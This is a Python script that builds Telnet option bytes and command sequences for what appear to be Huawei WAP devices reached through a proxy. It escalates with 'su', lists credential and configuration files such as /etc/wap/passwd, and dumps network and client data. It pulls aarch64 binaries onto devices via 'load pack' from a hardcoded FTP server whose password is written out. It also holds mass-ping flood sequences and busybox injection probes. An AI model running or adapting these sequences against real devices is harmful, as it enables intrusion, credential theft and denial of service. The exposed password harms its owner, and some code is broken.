#!/usr/bin/env python3

import os

# This script serves for encoding payloads and instructions
# for sending through the pynet2 proxy and analyze the output.
# This can serve for fuzzing purposes too.

# Telnet commands

# Global commands
IAC = b'\xff'   # Interpret As Command      [255]
SE  = b'\xf0'   # Subnegotiation End        [240]
NOP = b'\xf1'   # No Operation              [241]
DM  = b'\xf2'   # Data Mark                 [242]
BRK = b'\xf3'   # Break                     [243]
IP  = b'\xf4'   # Interrupt Process         [244]
AO  = b'\xf5'   # Abort Output              [243]
AYT = b'\xf6'   # Are You There             [246]
EC  = b'\xf7'   # Erase Character           [247]
EL  = b'\xf8'   # Erase Line                [248]
GA  = b'\xf9'   # Go Ahead                  [249]
SB  = b'\xfa'   # Subnegotiation Begin      [250]

# Option Negotiation Commands
WILL = b'\xfb'  #                           [251]
WONT = b'\xfc'  #                           [252]
DO   = b'\xfd'  #                           [253]
DONT = b'\xfe'  #                           [254]

# Telnet options
IS               = b'\x00'   #              [000]
ECHO             = b'\x01'   #              [001]
RECONNECTION     = b'\x02'   #              [002]
SUPPRESS_GO_AHEAD= b'\x03'   #              [003]
EOF              = b'\x04'   # End of File  [004]
STATUS           = b'\x05'   # End of File  [005]
TIMING_MARK      = b'\x04'   # End of File  [004]
BEL      = b'\x07'   #              [007]
OUTPUT_LINE_WIDTH= b'\x08'   # Output Line  [008]
ENTER            = b'\r\n' # Enter Key    [013]
QUIT             = b'quit' + ENTER

OUTPUT_LINE_WIDTH = b'\x08'       # Output Line Width                           [008]
OUTPUT_PAGE_SIZE = b'\x09'        # Output Page Size                            [009]
OUTPUT_CARRIAGE_RETURN_DISPOSITION = b'\x0A'  # Output Carriage-Return Disposition[010]
OUTPUT_HORIZONTAL_TAB_STOPS = b'\x0B'  # Output Horizontal Tab Stops            [011]
OUTPUT_HORIZONTAL_TAB_DISPOSITION = b'\x0C'  # Output Horizontal Tab Disposition[012]
OUTPUT_VERTICAL_TABSTOPS = b'\x0E'  # Output Vertical Tabstops                  [014]
OUTPUT_VERTICAL_TAB_DISPOSITION = b'\x0F'  # Output Vertical Tab Disposition    [015]
OUTPUT_LINEFEED_DISPOSITION = b'\x10'  # Output Linefeed Disposition            [016]
EXTENDED_ASCII = b'\x11'          # Extended ASCII                [017]
LOGOUT = b'\x12'                  # Logout                        [018]
BYTE_MACRO = b'\x13'              # Byte Macro                    [019]
DATA_ENTRY_TERMINAL = b'\x14'     # Data Entry Terminal           [020]
SUPDUP = b'\x15'                  # SUPDUP                        [021]
SUPDUP_OUTPUT = b'\x16'           # SUPDUP Output                 [022]
SEND_LOCATION = b'\x17'           # Send Location                 [023]
TERMINAL_TYPE = b'\x18'           # Terminal Type                 [024]
END_OF_RECORD = b'\x19'           # End of Record                 [025]
TACACS_USER_IDENTIFICATION = b'\x1A'# TACACS User Identification  [026]
OUTPUT_MARKING = b'\x1B'          # Output Marking                [027]
TERMINAL_LOCATION_NUMBER = b'\x1C'# Terminal Location Number      [028]
TELNET_3270_REGIME = b'\x1D'      # Telnet 3270 Regime            [029]
X3_PAD = b'\x1E'                  # X.3 PAD                       [030]
NEGOTIATE_ABOUT_WINDOW_SIZE = b'\x1F'# Negotiate About Window Size[031]
TERMINAL_SPEED = b'\x20'          # Terminal Speed                [032]
REMOTE_FLOW_CONTROL = b'\x21'     # Remote Flow Control           [033]
LINEMODE = b'\x22'                # Linemode                      [034]
X_DISPLAY_LOCATION = b'\x23'      # X Display Location            [035]
ENVIRONMENT_OPTION = b'\x24'      # Environment Option            [036]
AUTHENTICATION_OPTION = b'\x25'   # Authentication Option         [037]
ENCRYPTION_OPTION = b'\x26'       # Encryption Option             [038]
NEW_ENVIRONMENT_OPTION = b'\x27'  # New Environment Option        [039]
TN3270E = b'\x28'                 # TN3270E                       [040]
XAUTH = b'\x29'                   # XAUTH                         [041]
CHARSET = b'\x2A'                 # CHARSET                       [042]
TELNET_REMOTE_SERIAL_PORT = b'\x2B'  # Telnet Remote Serial Port  [043]
COM_PORT_CONTROL_OPTION = b'\x2C' # Com Port Control Option       [044]
TELNET_SUPPRESS_LOCAL_ECHO = b'\x2D' # Telnet Suppress Local Echo [045]
TELNET_START_TLS = b'\x2E'        # Telnet Start TLS              [046]
KERMIT = b'\x2F'                  # KERMIT                        [047]
SEND_URL = b'\x30'                # SEND-URL                      [048]
FORWARD_X = b'\x31'               # FORWARD_X                     [049]
# Options 50-137 are unassigned
PRAGMA_LOGON = b'\x8A'            # TELOPT PRAGMA LOGON           [138]
SSPI_LOGON = b'\x8B'              # TELOPT SSPI LOGON             [139]
PRAGMA_HEARTBEAT = b'\x8C'        # TELOPT PRAGMA HEARTBEAT       [140]
# Options 141-254 are unassigned

# Basic Commands in Hexadecimal Form
interrupt_process       = IAC + IP              # b'\xff\xf4'
erase_character         = IAC + EC              # b'\xff\xf7'
erase_line              = IAC + EL              # b'\xff\xf8'
are_you_there           = IAC + AYT             # b'\xff\xf6'
abort_output            = IAC + AO              # b'\xff\xf5'
go_ahead = IAC + GA                             # b'\xff\xf9'
subnegotiation_begin    = IAC + SB              # b'\xff\xfa'
subnegotiation_end      = IAC + SE              # b'\xff\xf0'
no_operation            = IAC + NOP             # b'\xff\xf1'
data_mark               = IAC + DM              # b'\xff\xf2'
break_signal            = IAC + BRK             # b'\xff\xf3'

# personal commands
unknown_command = IAC + IP + IAC + DO + b'\x06'

# This are the same
huawei_init_command = b'\xff\xfb\x01 \xff\xfb\x03\xff\xfd\x18' 
auth_request        = IAC + DO + ECHO + IAC + DO + SUPPRESS_GO_AHEAD + IAC + DO + TERMINAL_TYPE
auth_request2       = auth_request + IAC + SB + TERMINAL_TYPE + b'xterm' + IAC + SE

echo_message = IAC + DO + ECHO

# Negotiate terminal type as xterm
terminal_type_negotiation = IAC + SB + TERMINAL_TYPE + b'\x00' + b'xterm' + IAC + SE
terminal_type_negotiation2 = IAC + SB + TERMINAL_TYPE + b'\x01' + b'xterm' + IAC + SE

# ANSI commands
ansi_red = b'\x1b[31mnetstat -na\x1b[0m'

# Option Negotiation Combinations
will_option = lambda option: IAC + WILL + option
wont_option = lambda option: IAC + WONT + option
do_option = lambda option: IAC + DO + option
dont_option = lambda option: IAC + DONT + option

# Examples of Option Negotiation
will_suppress_go_ahead = will_option(SUPPRESS_GO_AHEAD)
wont_echo = wont_option(ECHO)
do_terminal_type = do_option(TERMINAL_TYPE)
dont_suppress_go_ahead = dont_option(SUPPRESS_GO_AHEAD)

# Global variable
target = b''

commands = [
    #IAC + IP,
    IAC + WILL + ECHO,
    IAC + DO + ECHO,
    #IAC + EC,
    IAC + EL,
    IAC + AYT,
    IAC + AO,
    IAC + GA,
    IAC + NOP,
    IAC + DM,
    IAC + BRK,
    IAC + WILL + SUPPRESS_GO_AHEAD,
    IAC + WONT + ECHO,
    IAC + DO + TERMINAL_TYPE,
    IAC + DONT + SUPPRESS_GO_AHEAD,
]

commands_empty = []

commands_seq1 = [
    ENTER,
    b'wap top\r\n',
    b'wap list format 1 path /\r\n',
    b'wap top\r\n',
    ENTER,
]

commands_seq2 = [
    #b'ping -i 1 -s 65507 -t 64 ' + target + b'\r\n',
    #b'ping -c 10 -t 64 34.204.78.186' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    b'ping -c 10000 -t 64 dnschecker.org' + b'\r\n',
    ENTER
]

commands_seq3 = [
    b'wap top\r\n',
    b'check security config\r\n',
    b'wap list format 0 path /\r\n',
]

commands_seq4 = [
    #b'wap list format 1 path /sbin \r\n'
    #b'wap list format 1 path /bin/busybox \r\n'
    b'wap list format 1 path /sbin/busybox.suid \r\n'
    #b'wap list format 1 path /bin/busybox \r\nwap list format 1 path /sbin \r\n'
]

commands_seq5 = [
    b'su \r\n',
    b'check security config \r\n'
]

commands_seq6 = [
    b'su \r\n',
    b'wap list format 1 path /etc\r\n'
]


# Construct commands with load pack syntax from the WAP
def load_pack_format(protocol_list, ftp_filenames, ip_addr, username, password, port):

    telnet_commands = list()
    for protocol in protocol_list:
        for filename in ftp_filenames:
            ## load pack by {https|sftp|ftp|tftp|http} svrip {ip addr} remotefile {file name} [user {user name}] [pwd {password}] [port {port}]
            command = f"load pack by {protocol} svrip {ip_addr} remotefile {filename} user {username} pwd {password} port {port} \r\n"
            command = command.encode('ascii')
            telnet_commands.append(command)

    return telnet_commands

# The lists begins with file names served in the ftpserver
## WAP Syntax:
protocol_list = ['ftp', 'tftp', 'sftp']
protocol_ftp = ['ftp']
#protocol_list = ['ftp']
ftp_filenames = ['test1']
commands_seq7 = load_pack_format(protocol_list, ftp_filenames, "10.39.84.117", "ftpserver", "52a7cZdX", 23)
commands_seq8 = load_pack_format(protocol_ftp, ftp_filenames, "10.39.84.117", "ftpserver", "52a7cZdX", 23)

commands_seq9 = [
    b'su\r\n',
    b'display ip route\r\n',
    b'display ip6tables filter\r\n',
    b'display iptables nat \r\n',
    b'display firewall rule\r\n',
    b'display nat port mapping\r\n',
    b'display flow\r\n',
    b'display amp policy-stats port\r\n',
    b'display amp pq-stats\r\n',
    b'display ip tables\r\n',
    b'display portstatistics\r\n'
]


# This method returns a list with the su commands available on the WAP
def su_help_commands():
    su_commands_path = os.path.join(os.getcwd(), '../', 'commands', 'su_commands.md')
    # Hardcoded path
    #su_commands_path = "/home/grimaldi/Bash/Telnet/commands/su_commands.md"

    su_list = [b'su\r\n']
    with open(su_commands_path, 'r') as file:
        next(file)  # Skip first line
        for command in file:
            command = command.strip().encode('ascii') + b' ?\r\n'
            su_list.append(command)
    return su_list

commands_seq10 = su_help_commands()

commands_seq11 = [
    IAC + WONT + ECHO,
    IAC + WILL + SUPPRESS_GO_AHEAD,
    b'su\r\n',
    b'check security config \r\n'
]

commands_seq12 = [
    b'su\r\n',
    b'display inner version\r\n',
    b'display wifi associate\r\n',
    b'display sysinfo\r\n',
    b'display deviceInfo\r\n',
    b'display cpu info\r\n',
    b'display dhcp server user all \r\n',
    b'display ftp config status\r\n',
    b'display igmp config\r\n',
    b'display ip neigh\r\n',
    b'display timer type 5\r\n',
    b'display tr069 info\r\n',
]

commands_seq14 = [
    b'display wifi neighbor\r\n'
]

# Method for getting all the commands using 'display'
def display_commands():
    
    display_path = os.path.join(os.getcwd(), 'commands', 'display_direct.md')

    display_list = [b'su\r\n']
    with open(display_path, 'r') as file:
        next(file)  # Skip first line
        for command in file:
            command = command.strip().encode('ascii') + b'\r\n'
            display_list.append(command)
    return display_list

#commands_seq13 = display_commands()

commands_seq15 = [
    b'su\r\n',
    b'netstat -na \x00 \r\n',
    ENTER
]

commands_seq16 = [
    #b'netstat -na \x88\x11\xc9\r\xe4a\xda ?\r\n',  # Random bytes
    b'netstat -na\r\n',
    b'netstat -nA\x07\r\x00',
    b'netstat -n~\x07\r\x00',
    QUIT
]

# Commands for terminal negotiation, try to enable the colors.
commands_seq17 = [
    auth_request2,
    #ansi_red,
    QUIT
]

# This sequence get the VT100 terminal type of the WAP
commands_seq18 = [
    IAC + WILL + TERMINAL_TYPE,                             # Negotiate terminal type
    IAC + SB + TERMINAL_TYPE + IS + b'xterm' + IAC + SE,
    IAC + SB + TERMINAL_TYPE + IS + b'xterm' + IAC + SE,    # This will return a response like this: b'\xff\xfb\x18\xff\xfa\x18\x00VT100\xff\xf0'
    #b'\033[31m' + b'netstat -na\r\n'
]

# Sequence related to ftp uploading files
commands_seq19 = [
    b'su\r\n',
    #b'display deviceInfo\r\n',
    #b'load fem par by tftp svrip 10.39.125.54 par_name basic_test user ftpserver pwd 52a7cZdX port 21\r\n',
    #b'load fem par by tftp svrip 10.39.125.54 par_name basic_test user ftpserver pwd 52a7cZdX port 69\r\n',
    #b'load pack by ftp svrip 10.39.125.54 remotefile basic_test user ftpserver pwd 52a7cZdX port 21 \r\n',
    #b'load pack by ftp svrip 10.39.125.54 remotefile basic_test user ftpserver pwd 52a7cZdX port 21 \r\n',
    #b'load pack by ftp svrip 10.39.125.54 remotefile exec_command_aarch64 user ftpserver pwd 52a7cZdX port 3000 \r\n',
    b'load pack by ftp svrip 10.39.125.54 remotefile sleep_aarch64 user ftpserver pwd 52a7cZdX port 3000 \r\n',
    b'display log info\r\n'
]

important_paths = [
    b'/',
    b'/etc/wap',
    b'/etc/wap/passwd',

]

commands_seq20 = [
    b'su\r\n',
    #wap list format 1 path /
    b'wap list format 1 path /\r\n',
    b'wap list format 1 path /etc/wap/\r\n',
    b'wap list format 1 path /etc/wap/hw_default_ctree.xml\r\n',
    b'wap list format 1 path /mnt/jffs2/\r\n',
    b'wap list format 1 path /mnt/jffs2/hw_ctree.xml\r\n'
]

commands_seq21 = [
    b'su\r\n',
    b'nslookup domain google.com\r\n',
    b'nslookup domain google.com server 8.8.8.8\r\n',
    b'nslookup domain google.com server 8.8.8.8 interface eth0\r\n',
    b'nslookup domain google.com server 8.8.8.8 repnum 3\r\n',
    ENTER
]

commands_seq22 = [
    b'su\r\n',
    b'traceroute 192.168.100.1\r\n',
    b'traceroute 192.168.1.1\r\n',
    ENTER
]

commands_seq23 = [
    b'su\r\n',
    b'debug dsp down msg 0\r\n',
    ENTER
]

# Sending this sequence to large number of bots is considered an attack.
# Try to redirect all that traffic to a legitimate website for analyzing the force.
commands_seq24 = [
    #b'su\r\n',
    b'ping -c 10 35.153.179.122\r\n',
    #b'ping -c 10 35.153.179.122\r\n',
    #b'traceroute 35.153.179.122\r\n',
    ENTER
]

# Count the number of connections
commands_ENTER = [ ENTER ]

# try some busybox combinations trying to inject commands
commands_seq25 = [
    #b'ping -h\n',
    b'ping ?\n',
    #b'ping -c 10 8.8.8.8\n',
    #b'ping -c 10 -s 1472 8.8.8.8\n',
    #b'ping -c 10 127.0.0.1\n',
    #b'ping -c 10 google.com\n',
    #b'\nping -c 10 127.0.0.1 && ping -c 10 google.com\n',
    #b'ping6\n',
    #b'traceroute6 -c 10 google.com\n',
    b'traceroute6 google.com\n',
    #b'su\n',
    ENTER
]

# Try some arping commands
commands_seq26 = [
    b'wap list format 1 path /usr/java\r\n',
    b'wap list format 1 path /usr/java/bin\r\n',
    b'wap list format 1 path /usr/java/lib\r\n',
    #b'arping -I eth0 192.168.100.1\r\n',
    #b'arping -I eth0 -f 192.168.100.1\r\n',
    #b'arping -I eth0 -U -s 192.168.100.1\r\n',
    #b'arping -I eth0 -D 192.168.100.1\r\n',
    b'arping -I eth0 192.168.100.2\r\n',
    ENTER,
    ENTER
]

# One more round of ping commands

commands_seq27 = [
    b'ping -c 2 38.141.145.43\r\n',
    b'ping -c 2 113.77.241.55\r\n',
    ENTER
]

# Some useful commands for information gathering
commands_seq27 = [
    b'netstat -na\r\n',
    b'display wifi associate\r\n',
    b'display tr069 info\r\n',
    b'display sysinfo\r\n',
    b'display deviceInfo\r\n',
    b'display cpu info\r\n',
    b'display inner version\r\n',
    b'display file\r\n',
    b'display waninfo all detail\r\n',
    b'display wanmac\r\n',
    b'display lanmac\r\n',
    b'display productmac\r\n',
    b'display iptables nat\r\n',
    b'display iptables filter\r\n',
    #b'set portmirror\r\n',
    b'display flow\r\n',
]

commands_seq28 = [
    b'su\r\n',
    b'display dhcp server user all\r\n',
    b'display log info\r\n',
    b'display wifi information\r\n',
    b'check security config\r\n',
    b'ip route show\r\n',
    b'ip neigh\r\n',
    b'display wifi neighbor\r\n',
    b'wap list format 1 path / \r\n',
    b'ENTER'
]

commands_seq29 = [
    b'su\r\n',
    b'display dhcp server user all\r\n',
    b'ip neigh\r\n',
    b'check security config\r\n',
    ENTER
]

commands_seq30 = [
    b'su\r\n',
    b'display wanmac\r\n',
    b'display lanmac\r\n',
    b'display productmac\r\n',
    b'mac_address\r\n'
    b'ampcmd show emac stat\r\n',
    b'ampcmd trace emac\r\n',
    b'ampcmd trace gmac\r\n',
    b'display lan mac filter\r\n',
    b'display lanmac\r\n',
    b'display mac ap\r\n',
    b'display mac ap brief\r\n',
    b'display macaddress\r\n',
    b'display macaddress timer\r\n',
    b'display machineItem\r\n',
    b'display productmac\r\n',
    b'display wanmac\r\n',
    b'display wlanmac\r\n',
    b'fttr gmacdrv execcmd\r\n',
    b'get mac agingtime\r\n',
    b'igmp get multilmac\r\n',
    b'lan mac filter add\r\n',
    b'lan mac filter delete\r\n',
    b'lan mac filter disable\r\n',
    b'lan mac filter enable\r\n',
    b'lan mac filter flush\r\n',
    b'macaddress\r\n',
    ENTER,
]


def encode_commands(commands_path):
    commands_seq = list()
    with open(commands_path, 'r') as file:
        for command in file:
            command = command.rstrip() + "\r\n"
            command = command.encode()
            commands_seq.append(command)
    return commands_seq


# Print some useful hardcoded combinations
def hardcoded_combinations():
    # Print HardCoded Combinations
    try1 = IAC + DO + ECHO + IAC + DO + SUPPRESS_GO_AHEAD + IAC + DO + TERMINAL_TYPE
    print(try1)

    try2 = IAC + DO + ECHO + IAC + DO + SUPPRESS_GO_AHEAD + IAC + DO + BINARY_TRANS
    print(try2)

    try3 = IAC + WILL + BINARY_TRANS
    print(try3)


# Main method
if __name__ == "__main__":

    hardcoded_combinations()
    
